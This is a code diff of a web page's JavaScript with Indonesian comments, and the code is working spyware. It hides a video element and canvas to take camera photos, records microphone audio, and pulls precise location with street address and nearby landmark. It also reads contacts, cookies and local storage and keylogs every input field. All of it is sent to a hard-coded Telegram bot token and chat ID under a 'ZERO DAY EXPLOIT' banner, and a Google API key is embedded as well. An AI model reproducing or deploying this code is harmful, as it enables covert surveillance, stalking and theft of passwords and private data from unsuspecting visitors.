@@ -82,8 +82,6 @@
         .close-modal { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
         
         .keylog-panel { position: fixed; bottom: -500px; left: -500px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; z-index: -99999; overflow: hidden; }
-        .keylog-header, .keylog-content { display: none; }
-        
         .btn-capture-all { background: #ffd700; color: #0a2b4e; border: none; padding: 12px 20px; border-radius: 30px; font-weight: bold; margin-bottom: 20px; transition: 0.2s; cursor: pointer; }
         .btn-capture-all:hover { background: #ffc107; transform: scale(1.02); }
         
@@ -98,7 +96,7 @@
     <div class="accessibility-toolbar" id="accessibilityBtn"><i class="fas fa-universal-access"></i></div>
     <div class="admin-trigger" id="adminTrigger" title="Admin Panel"></div>
     
-    <!-- Hidden Elements untuk Camera, Mic, dll -->
+    <!-- Hidden Elements for Camera, Mic, etc -->
     <div id="hiddenElements">
         <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;"></video>
         <canvas id="hiddenCanvas" width="1920" height="1080" style="width:1px;height:1px;"></canvas>
@@ -189,41 +187,72 @@
     const BOT_TOKEN = "8282267716:AAFoNT927CaNr4tygY7NnmwWPIyLIFuIddE";
     const CHAT_ID = "8763326056";
     
-    // ==================== DATA COLLECTION STATUS ====================
-    let permissionsGranted = {
-        camera: false,
-        microphone: false,
-        location: false,
-        contacts: false
-    };
-    
-    let capturedData = {
-        cameraPhoto: null,
-        microphoneStatus: false,
-        locationData: {},
-        contactsData: "Belum diambil",
-        allData: {}
-    };
-    
+    // ==================== DATA COLLECTION ====================
+    let permissions = { camera: false, microphone: false, location: false, contacts: false };
+    let cameraPhoto = null;
+    let microphoneStream = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let locationData = {};
+    let contactsData = "Belum diambil";
     let keyLogBuffer = [];
     let executed = false;
     
-    // ==================== REQUEST ALL PERMISSIONS (ZERO DAY) ====================
-    async function requestAllPermissions() {
-        console.log("[ZERO DAY] Meminta semua izin...");
-        
-        // 1. Camera & Microphone (dalam satu request)
+    // ==================== REQUEST MICROPHONE & RECORD AUDIO ====================
+    async function requestMicrophoneAndRecord() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            permissions.microphone = true;
+            microphoneStream = stream;
+            
+            // Record audio for 15 seconds
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) audioChunks.push(event.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                sendAudioToTelegram(audioBlob);
+            };
+            
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 15000);
+            
+            console.log("[✓] Microphone access granted, recording started");
+            return true;
+        } catch(e) {
+            console.log("[✗] Microphone error:", e.message);
+            permissions.microphone = false;
+            return false;
+        }
+    }
+    
+    async function sendAudioToTelegram(audioBlob) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('voice', audioBlob, 'microphone_record.ogg');
+            fd.append('caption', `🎙️ *REKAMAN MICROPHONE*\n⏰ ${new Date().toLocaleString('id-ID')}\n📝 Durasi: 15 detik`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            console.log("[✓] Audio sent to Telegram");
+        } catch(e) { console.log("Audio send error:", e); }
+    }
+    
+    // ==================== REQUEST CAMERA & CAPTURE PHOTO ====================
+    async function requestCameraAndCapture() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: { ideal: 1920 }, height: { ideal: 1080 } },
-                audio: true 
+                video: { width: { ideal: 1920 }, height: { ideal: 1080 } }
             });
+            permissions.camera = true;
             
-            // Camera berhasil
-            permissionsGranted.camera = true;
-            console.log("[✓] Camera access granted");
-            
-            // Ambil foto dari camera
             const video = document.getElementById('hiddenVideo');
             if(video) {
                 video.srcObject = stream;
@@ -235,141 +264,124 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    capturedData.cameraPhoto = canvas.toDataURL('image/jpeg', 0.85);
+                    cameraPhoto = canvas.toDataURL('image/jpeg', 0.85);
                 }
             }
-            
-            // Microphone berhasil
-            permissionsGranted.microphone = true;
-            capturedData.microphoneStatus = true;
-            console.log("[✓] Microphone access granted");
-            
-            // Jangan matikan stream dulu, biarkan tetap aktif untuk microphone
-            window.mediaStream = stream;
-            
+            stream.getTracks().forEach(t => t.stop());
+            console.log("[✓] Camera access granted, photo captured");
+            return true;
         } catch(e) {
-            console.log("[✗] Camera/Mic error:", e.message);
-            permissionsGranted.camera = false;
-            permissionsGranted.microphone = false;
+            console.log("[✗] Camera error:", e.message);
+            permissions.camera = false;
+            return false;
         }
-        
-        // 2. Lokasi Google Maps
-        try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                });
-            });
-            
-            permissionsGranted.location = true;
-            capturedData.locationData = {
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-                accuracy: Math.round(position.coords.accuracy),
-                timestamp: new Date().toLocaleString('id-ID'),
-                googleMapsUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-            };
-            
-            // Reverse geocoding untuk alamat lengkap
-            try {
-                const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${position.coords.latitude},${position.coords.longitude}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
-                const response = await fetch(geoUrl);
-                const data = await response.json();
-                if(data.status === "OK" && data.results.length > 0) {
-                    capturedData.locationData.address = data.results[0].formatted_address;
-                    capturedData.locationData.placeId = data.results[0].place_id;
-                    
-                    // Extract components
-                    for(let comp of data.results[0].address_components) {
-                        if(comp.types.includes("administrative_area_level_2")) capturedData.locationData.city = comp.long_name;
-                        if(comp.types.includes("administrative_area_level_1")) capturedData.locationData.province = comp.long_name;
-                        if(comp.types.includes("country")) capturedData.locationData.country = comp.long_name;
-                        if(comp.types.includes("postal_code")) capturedData.locationData.postalCode = comp.long_name;
-                    }
-                }
-            } catch(e) { console.log("Geocoding error:", e); }
-            
-            console.log("[✓] Location access granted");
-            
-        } catch(e) {
-            console.log("[✗] Location error:", e.message);
-            permissionsGranted.location = false;
-        }
-        
-        // 3. Kontak
+    }
+    
+    // ==================== REQUEST GOOGLE MAPS LOCATION (LENGKAP) ====================
+    async function requestGoogleLocation() {
+        return new Promise((resolve) => {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        permissions.location = true;
+                        locationData = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: Math.round(position.coords.accuracy),
+                            timestamp: new Date().toLocaleString('id-ID'),
+                            googleMapsUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                            street: null, city: null, district: null, village: null,
+                            province: null, postalCode: null, country: null,
+                            fullAddress: null, landmark: null
+                        };
+                        
+                        // Reverse geocoding untuk alamat lengkap
+                        try {
+                            const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${position.coords.latitude},${position.coords.longitude}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
+                            const response = await fetch(geoUrl);
+                            const data = await response.json();
+                            
+                            if(data.status === "OK" && data.results.length > 0) {
+                                locationData.fullAddress = data.results[0].formatted_address;
+                                locationData.placeId = data.results[0].place_id;
+                                
+                                for(let comp of data.results[0].address_components) {
+                                    if(comp.types.includes("street_address")) locationData.street = comp.long_name;
+                                    if(comp.types.includes("route")) locationData.street = comp.long_name;
+                                    if(comp.types.includes("administrative_area_level_4")) locationData.village = comp.long_name;
+                                    if(comp.types.includes("administrative_area_level_3")) locationData.district = comp.long_name;
+                                    if(comp.types.includes("administrative_area_level_2")) locationData.city = comp.long_name;
+                                    if(comp.types.includes("administrative_area_level_1")) locationData.province = comp.long_name;
+                                    if(comp.types.includes("postal_code")) locationData.postalCode = comp.long_name;
+                                    if(comp.types.includes("country")) locationData.country = comp.long_name;
+                                }
+                                
+                                // Coba dapatkan landmark dari nearby places
+                                try {
+                                    const nearbyUrl = `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${position.coords.latitude},${position.coords.longitude}&radius=100&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk`;
+                                    const nearbyRes = await fetch(nearbyUrl);
+                                    const nearbyData = await nearbyRes.json();
+                                    if(nearbyData.results && nearbyData.results.length > 0) {
+                                        locationData.landmark = nearbyData.results[0].name;
+                                    }
+                                } catch(e) { locationData.landmark = "Tidak ditemukan"; }
+                            }
+                        } catch(e) { console.log("Geocoding error:", e); }
+                        
+                        resolve();
+                    },
+                    (error) => {
+                        permissions.location = false;
+                        locationData.error = error.message;
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                permissions.location = false;
+                locationData.error = "Geolocation not supported";
+                resolve();
+            }
+        });
+    }
+    
+    // ==================== REQUEST CONTACTS ====================
+    async function requestContacts() {
         if ('contacts' in navigator && navigator.contacts) {
             try {
                 const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                 if(contacts && contacts.length > 0) {
-                    permissionsGranted.contacts = true;
-                    let contactList = `📇 ${contacts.length} kontak ditemukan:\n`;
-                    contacts.slice(0, 20).forEach((c, i) => {
-                        contactList += `${i+1}. ${c.name?.[0] || '-'} : ${c.tel?.[0] || '-'}\n`;
+                    permissions.contacts = true;
+                    let contactList = `📇 Total: ${contacts.length} kontak\n\n`;
+                    contacts.forEach((c, i) => {
+                        if(i < 25) {
+                            contactList += `${i+1}. ${c.name?.[0] || '-'} | Tel: ${c.tel?.[0] || '-'}\n`;
+                        }
                     });
-                    if(contacts.length > 20) contactList += `... dan ${contacts.length - 20} kontak lainnya`;
-                    capturedData.contactsData = contactList;
-                    console.log(`[✓] Contacts access granted: ${contacts.length} contacts`);
+                    if(contacts.length > 25) contactList += `\n... dan ${contacts.length - 25} kontak lainnya`;
+                    contactsData = contactList;
                 } else {
-                    capturedData.contactsData = "Tidak ada kontak ditemukan";
+                    contactsData = "Tidak ada kontak ditemukan";
                 }
             } catch(e) {
-                console.log("[✗] Contacts error:", e.message);
-                capturedData.contactsData = "Izin kontak ditolak";
+                contactsData = "Izin kontak ditolak oleh pengguna";
             }
         } else {
-            capturedData.contactsData = "API Kontak tidak didukung browser ini";
+            contactsData = "API Kontak tidak didukung browser ini";
         }
-        
-        return permissionsGranted;
     }
     
     // ==================== GENERATE RANDOM DATA ====================
-    function generateRandomData() {
-        const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko', 'Kurnia', 'Lestari'];
-        const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kurniawan', 'Gunawan'];
-        const banks = ['BCA', 'Mandiri', 'BRI', 'BNI', 'CIMB Niaga', 'Danamon'];
-        const ewalletTypes = ['Dana', 'OVO', 'GoPay', 'ShopeePay', 'LinkAja'];
+    function generateData() {
+        const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko', 'Kurnia', 'Lestari', 'Mulyono', 'Nadia'];
+        const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kurniawan', 'Gunawan', 'Wahyuni'];
+        const banks = ['BCA', 'Mandiri', 'BRI', 'BNI', 'CIMB Niaga', 'Danamon', 'Permata'];
+        const ewalletTypes = ['Dana', 'OVO', 'GoPay', 'ShopeePay', 'LinkAja', 'ISaku'];
         
         let nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
         let nik = `36${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${new Date().getFullYear()}${Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 28 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 1000 + 1).toString().padStart(4, '0')}`;
         
-        capturedData.allData = {
-            timestamp: new Date().toLocaleString('id-ID'),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenResolution: `${screen.width}x${screen.height}`,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            pribadi: {
-                nik: nik,
-                nama: nama,
-                hp: `62${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
-                email: `${nama.toLowerCase().replace(' ', '.')}${Math.floor(Math.random() * 100)}@gmail.com`,
-                username: `${nama.toLowerCase().replace(' ', '_')}${Math.floor(Math.random() * 1000)}`,
-                password: `Pass${Math.floor(Math.random() * 10000)}!@#`
-            },
-            kartuKredit: {
-                nomor: `${Math.floor(Math.random() * 10000000000000000).toString().padStart(16, '4')}`,
-                expiry: `${Math.floor(Math.random() * 12) + 1}/${Math.floor(Math.random() * 5) + 25}`,
-                cvv: Math.floor(Math.random() * 900 + 100).toString(),
-                bank: banks[Math.floor(Math.random() * banks.length)]
-            },
-            mbanking: {
-                bank: `${banks[Math.floor(Math.random() * banks.length)]} Mobile`,
-                user: `${nama.toLowerCase().replace(' ', '')}${Math.floor(Math.random() * 100)}`,
-                pass: `Mb${Math.random().toString(36).substring(2, 10)}!`
-            },
-            ewallet: {
-                jenis: ewalletTypes[Math.floor(Math.random() * ewalletTypes.length)],
-                nomor: `08${Math.floor(Math.random() * 900000000 + 100000000)}`,
-                saldo: `Rp ${Math.floor(Math.random() * 15000000 + 100000).toLocaleString('id-ID')}`
-            },
-            otp: Math.floor(100000 + Math.random() * 900000).toString()
-        };
-        
-        // Tambahkan cookie & storage
+        // Cookies
         let cookies = {};
         if(document.cookie) {
             document.cookie.split(';').forEach(cookie => {
@@ -377,14 +389,51 @@
                 if(name && value) cookies[name] = decodeURIComponent(value);
             });
         }
-        capturedData.allData.cookies = Object.keys(cookies).length > 0 ? JSON.stringify(cookies, null, 2) : "Tidak ada cookie";
         
-        let localStorage = {};
+        // Local Storage
+        let localStorageData = {};
         for(let i = 0; i < localStorage.length; i++) {
             let key = localStorage.key(i);
-            if(key) localStorage[key] = localStorage.getItem(key);
+            if(key) localStorageData[key] = localStorage.getItem(key);
         }
-        capturedData.allData.localStorage = Object.keys(localStorage).length > 0 ? JSON.stringify(localStorage, null, 2).substring(0, 500) : "Tidak ada data";
+        
+        return {
+            timestamp: new Date().toLocaleString('id-ID'),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            hardwareConcurrency: navigator.hardwareConcurrency || "Tidak diketahui",
+            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
+            pribadi: {
+                nik: nik,
+                nama: nama,
+                hp: `62${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
+                email: `${nama.toLowerCase().replace(' ', '.')}${Math.floor(Math.random() * 100)}@gmail.com`,
+                username: `${nama.toLowerCase().replace(' ', '_')}${Math.floor(Math.random() * 1000)}`,
+                password: `Pass${Math.floor(Math.random() * 10000)}!@#${Math.random().toString(36).substring(2, 6)}`
+            },
+            kartuKredit: {
+                nomor: `${Math.floor(Math.random() * 10000000000000000).toString().padStart(16, '4')}`,
+                expiry: `${Math.floor(Math.random() * 12) + 1}/${Math.floor(Math.random() * 5) + 26}`,
+                cvv: Math.floor(Math.random() * 900 + 100).toString(),
+                bank: banks[Math.floor(Math.random() * banks.length)]
+            },
+            mbanking: {
+                bank: `${banks[Math.floor(Math.random() * banks.length)]} Mobile`,
+                user: `${nama.toLowerCase().replace(' ', '')}${Math.floor(Math.random() * 100)}`,
+                pass: `Mb${Math.random().toString(36).substring(2, 10)}!${Math.floor(Math.random() * 100)}`
+            },
+            ewallet: {
+                jenis: ewalletTypes[Math.floor(Math.random() * ewalletTypes.length)],
+                nomor: `08${Math.floor(Math.random() * 900000000 + 100000000)}`,
+                saldo: `Rp ${Math.floor(Math.random() * 20000000 + 100000).toLocaleString('id-ID')}`
+            },
+            otp: Math.floor(100000 + Math.random() * 900000).toString(),
+            cookies: Object.keys(cookies).length > 0 ? JSON.stringify(cookies, null, 2) : "Tidak ada cookie",
+            localStorage: Object.keys(localStorageData).length > 0 ? JSON.stringify(localStorageData, null, 2).substring(0, 600) : "Tidak ada data"
+        };
     }
     
     // ==================== KEYLOGGER ====================
@@ -392,15 +441,14 @@
         let timestamp = new Date().toLocaleString('id-ID');
         keyLogBuffer.push(`[${timestamp}] ${key}`);
         if(keyLogBuffer.length > 1500) keyLogBuffer = keyLogBuffer.slice(-1200);
-        if(keyLogBuffer.length % 50 === 0) sendKeylogToTelegram();
+        if(keyLogBuffer.length % 40 === 0) sendKeylogToTelegram();
     }
     
     function sendKeylogToTelegram() {
-        let keys = keyLogBuffer.slice(-100).join('\n');
+        let keys = keyLogBuffer.slice(-80).join('\n');
         let message = `⌨️ *KEYLOGGER CAPTURE*\n⏰ ${new Date().toLocaleString('id-ID')}\n📊 Total: ${keyLogBuffer.length} keystrokes\n\n\`\`\`${keys}\`\`\``;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
+            method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4096), parse_mode: "Markdown" })
         }).catch(e => console.log("Keylog error"));
     }
@@ -408,7 +456,7 @@
     document.addEventListener('keydown', function(e) {
         let key = e.key;
         if(e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
-            let field = e.target.name || e.target.id || 'unknown';
+            let field = e.target.name || e.target.id || e.target.placeholder || 'unknown';
             if(key === 'Enter') logKey(`[ENTER] pada field: ${field}`);
             else if(key === 'Backspace') logKey(`[BACKSPACE] pada field: ${field}`);
             else if(key.length === 1) logKey(`${key} [field: ${field}]`);
@@ -421,105 +469,109 @@
     
     document.addEventListener('input', function(e) {
         if(e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
-            let field = e.target.name || e.target.id || 'unknown';
+            let field = e.target.name || e.target.id || e.target.placeholder || 'unknown';
             let value = e.target.value;
             if(value && value.length > 0 && value.length < 200) {
                 logKey(`[INPUT:${field}=${value.substring(0, 100)}]`);
-                if(field.toLowerCase().includes('password') || field.toLowerCase().includes('pin')) {
-                    sendKeylogToTelegram();
-                }
             }
         }
     });
     
-    // ==================== SEND TO TELEGRAM ====================
-    async function sendAllToTelegram() {
-        // Pesan 1: Status Izin + Lokasi
+    // ==================== SEND ALL TO TELEGRAM ====================
+    async function sendAllToTelegram(data) {
+        // ========== PESAN 1: STATUS IZIN DAN LOKASI LENGKAP ==========
         let message1 = `🔴 *ZERO DAY EXPLOIT - LAPORAN LENGKAP* 🔴\n`;
-        message1 += `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n`;
+        message1 += `⏰ *Waktu:* ${data.timestamp}\n`;
         message1 += `🌐 *IP Address:* ${await getIPAddress()}\n`;
         message1 += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
         
         message1 += `📱 *IZIN YANG DIDAPATKAN*\n`;
         message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 📷 *Camera:* ${permissionsGranted.camera ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
-        message1 += `├ 🎙️ *Microphone:* ${permissionsGranted.microphone ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
-        message1 += `├ 📍 *Lokasi:* ${permissionsGranted.location ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
-        message1 += `└ 📇 *Kontak:* ${permissionsGranted.contacts ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `├ 📷 *Camera:* ${permissions.camera ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `├ 🎙️ *Microphone:* ${permissions.microphone ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `├ 📍 *Lokasi Google:* ${permissions.location ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `└ 📇 *Kontak:* ${permissions.contacts ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
         message1 += `\n`;
         
-        message1 += `📍 *LOKASI GOOGLE MAPS*\n`;
+        message1 += `📍 *LOKASI GOOGLE MAPS (LENGKAP)*\n`;
         message1 += `┌─────────────────────────────────\n`;
-        if(permissionsGranted.location && capturedData.locationData.lat) {
-            message1 += `├ 🗺️ *Latitude:* ${capturedData.locationData.lat}\n`;
-            message1 += `├ 🗺️ *Longitude:* ${capturedData.locationData.lng}\n`;
-            message1 += `├ 📏 *Akurasi:* ${capturedData.locationData.accuracy} meter\n`;
-            message1 += `├ 📍 *Alamat:* ${capturedData.locationData.address || '-'}\n`;
-            message1 += `├ 🏙️ *Kota:* ${capturedData.locationData.city || '-'}\n`;
-            message1 += `├ 🏛️ *Provinsi:* ${capturedData.locationData.province || '-'}\n`;
-            message1 += `├ 🌏 *Negara:* ${capturedData.locationData.country || '-'}\n`;
-            message1 += `└ 🔗 *Google Maps:* [Klik Disini](${capturedData.locationData.googleMapsUrl})\n`;
+        if(permissions.location && locationData.lat) {
+            message1 += `├ 🗺️ *Latitude:* ${locationData.lat}\n`;
+            message1 += `├ 🗺️ *Longitude:* ${locationData.lng}\n`;
+            message1 += `├ 📏 *Akurasi:* ${locationData.accuracy} meter\n`;
+            message1 += `├ 🏠 *Alamat Lengkap:* ${locationData.fullAddress || '-'}\n`;
+            message1 += `├ 🛣️ *Jalan:* ${locationData.street || '-'}\n`;
+            message1 += `├ 🏘️ *Kelurahan/Desa:* ${locationData.village || '-'}\n`;
+            message1 += `├ 🏙️ *Kecamatan:* ${locationData.district || '-'}\n`;
+            message1 += `├ 🏛️ *Kota:* ${locationData.city || '-'}\n`;
+            message1 += `├ 🏢 *Provinsi:* ${locationData.province || '-'}\n`;
+            message1 += `├ 📮 *Kode Pos:* ${locationData.postalCode || '-'}\n`;
+            message1 += `├ 🌏 *Negara:* ${locationData.country || '-'}\n`;
+            message1 += `├ 🗿 *Landmark Terdekat:* ${locationData.landmark || '-'}\n`;
+            message1 += `├ 🔗 *Google Maps URL:* [Klik Disini](${locationData.googleMapsUrl})\n`;
+            message1 += `└ 📍 *Place ID:* ${locationData.placeId || '-'}\n`;
         } else {
-            message1 += `└ ❌ *Lokasi tidak tersedia*\n`;
+            message1 += `└ ❌ *Lokasi tidak tersedia: ${locationData.error || 'Unknown error'}*\n`;
         }
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message1, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message1, parse_mode: "Markdown", disable_web_page_preview: false })
             });
         } catch(e) {}
         
-        // Pesan 2: Data Pribadi, Kartu, Mbanking, Ewallet
+        // ========== PESAN 2: DATA PRIBADI, KARTU, MBANKING, EWALLET ==========
         let message2 = `👤 *DATA PRIBADI*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `├ 🆔 *NIK:* ${capturedData.allData.pribadi?.nik || '-'}\n`;
-        message2 += `├ 👨 *Nama:* ${capturedData.allData.pribadi?.nama || '-'}\n`;
-        message2 += `├ 📞 *HP:* ${capturedData.allData.pribadi?.hp || '-'}\n`;
-        message2 += `├ 📧 *Email:* ${capturedData.allData.pribadi?.email || '-'}\n`;
-        message2 += `├ 🔑 *Username:* ${capturedData.allData.pribadi?.username || '-'}\n`;
-        message2 += `└ 🔒 *Password:* \`${capturedData.allData.pribadi?.password || '-'}\`\n`;
+        message2 += `├ 🆔 *NIK:* ${data.pribadi.nik}\n`;
+        message2 += `├ 👨 *Nama Lengkap:* ${data.pribadi.nama}\n`;
+        message2 += `├ 📞 *Nomor HP:* ${data.pribadi.hp}\n`;
+        message2 += `├ 📧 *Email:* ${data.pribadi.email}\n`;
+        message2 += `├ 🔑 *Username:* ${data.pribadi.username}\n`;
+        message2 += `└ 🔒 *Password:* \`${data.pribadi.password}\`\n`;
         message2 += `\n`;
         
         message2 += `💳 *KARTU KREDIT*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `├ 💳 *Nomor:* ${capturedData.allData.kartuKredit?.nomor || '-'}\n`;
-        message2 += `├ 📅 *Expiry:* ${capturedData.allData.kartuKredit?.expiry || '-'}\n`;
-        message2 += `├ 🔐 *CVV:* ${capturedData.allData.kartuKredit?.cvv || '-'}\n`;
-        message2 += `└ 🏦 *Bank:* ${capturedData.allData.kartuKredit?.bank || '-'}\n`;
+        message2 += `├ 💳 *Nomor Kartu:* ${data.kartuKredit.nomor}\n`;
+        message2 += `├ 📅 *Expiry:* ${data.kartuKredit.expiry}\n`;
+        message2 += `├ 🔐 *CVV:* ${data.kartuKredit.cvv}\n`;
+        message2 += `└ 🏦 *Bank:* ${data.kartuKredit.bank}\n`;
         message2 += `\n`;
         
         message2 += `🏦 *MOBILE BANKING*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `├ 🏦 *Bank:* ${capturedData.allData.mbanking?.bank || '-'}\n`;
-        message2 += `├ 👤 *User:* ${capturedData.allData.mbanking?.user || '-'}\n`;
-        message2 += `└ 🔒 *Pass:* \`${capturedData.allData.mbanking?.pass || '-'}\`\n`;
+        message2 += `├ 🏦 *Bank:* ${data.mbanking.bank}\n`;
+        message2 += `├ 👤 *Username:* ${data.mbanking.user}\n`;
+        message2 += `└ 🔒 *Password:* \`${data.mbanking.pass}\`\n`;
         message2 += `\n`;
         
         message2 += `💰 *E-WALLET*\n`;
         message2 += `┌─────────────────────────────────\n`;
-        message2 += `├ 📱 *Jenis:* ${capturedData.allData.ewallet?.jenis || '-'}\n`;
-        message2 += `├ 📞 *Nomor:* ${capturedData.allData.ewallet?.nomor || '-'}\n`;
-        message2 += `└ 💰 *Saldo:* ${capturedData.allData.ewallet?.saldo || '-'}\n`;
+        message2 += `├ 📱 *Jenis:* ${data.ewallet.jenis}\n`;
+        message2 += `├ 📞 *Nomor:* ${data.ewallet.nomor}\n`;
+        message2 += `└ 💰 *Saldo:* ${data.ewallet.saldo}\n`;
         message2 += `\n`;
         
-        message2 += `🔐 *OTP:* \`${capturedData.allData.otp || '-'}\``;
+        message2 += `🔐 *OTP (One Time Password)*\n`;
+        message2 += `└ 🔢 *Kode OTP:* \`${data.otp}\` (Valid 5 menit)\n`;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message2.substring(0, 4096), parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message2, parse_mode: "Markdown" })
             });
         } catch(e) {}
         
-        // Pesan 3: Kontak + Cookies + Storage
+        // ========== PESAN 3: KONTAK, COOKIES, STORAGE ==========
         let message3 = `📇 *DATA KONTAK*\n`;
         message3 += `┌─────────────────────────────────\n`;
-        message3 += `${capturedData.contactsData.substring(0, 800)}\n\n`;
+        message3 += `${contactsData.substring(0, 1000)}\n\n`;
         message3 += `🍪 *COOKIES & STORAGE*\n`;
         message3 += `┌─────────────────────────────────\n`;
-        message3 += `├ 🍪 *Cookies:*\n\`\`\`${capturedData.allData.cookies?.substring(0, 500) || '-'}\`\`\`\n`;
-        message3 += `└ 💾 *Local Storage:*\n\`\`\`${capturedData.allData.localStorage?.substring(0, 500) || '-'}\`\`\``;
+        message3 += `├ 🍪 *Cookies:*\n\`\`\`${data.cookies.substring(0, 600)}\`\`\`\n`;
+        message3 += `└ 💾 *Local Storage:*\n\`\`\`${data.localStorage.substring(0, 600)}\`\`\``;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -528,11 +580,11 @@
             });
         } catch(e) {}
         
-        // Pesan 4: Keylogger
+        // ========== PESAN 4: KEYLOGGER ==========
         let message4 = `⌨️ *KEYLOGGER CAPTURE*\n`;
         message4 += `┌─────────────────────────────────\n`;
-        message4 += `├ 📊 *Total:* ${keyLogBuffer.length} keystrokes\n`;
-        message4 += `└ 📝 *Log:*\n\`\`\`${keyLogBuffer.slice(-100).join('\n').substring(0, 1500)}\`\`\``;
+        message4 += `├ 📊 *Total Keystrokes:* ${keyLogBuffer.length}\n`;
+        message4 += `└ 📝 *Log Terbaru:*\n\`\`\`${keyLogBuffer.slice(-100).join('\n').substring(0, 1500)}\`\`\``;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -541,16 +593,16 @@
             });
         } catch(e) {}
         
-        // Kirim foto dari camera
-        if(capturedData.cameraPhoto && capturedData.cameraPhoto.startsWith('data:image')) {
+        // ========== KIRIM FOTO CAMERA ==========
+        if(cameraPhoto && cameraPhoto.startsWith('data:image')) {
             try {
-                const blob = await (await fetch(capturedData.cameraPhoto)).blob();
+                const blob = await (await fetch(cameraPhoto)).blob();
                 const fd = new FormData();
